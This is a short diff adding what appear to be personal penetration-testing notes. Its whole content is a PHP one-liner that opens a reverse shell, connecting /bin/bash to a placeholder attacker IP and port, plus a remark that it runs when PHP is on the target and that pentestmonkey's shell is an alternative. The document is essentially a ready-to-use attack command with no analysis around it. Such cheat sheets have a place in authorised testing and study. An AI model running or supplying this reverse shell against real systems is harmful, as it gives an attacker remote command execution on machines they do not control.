@@ -1,0 +1,5 @@
+php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+can run this when php is on the target machine. Will most likely not create the best shell so can always use pentestmonkey
+
+
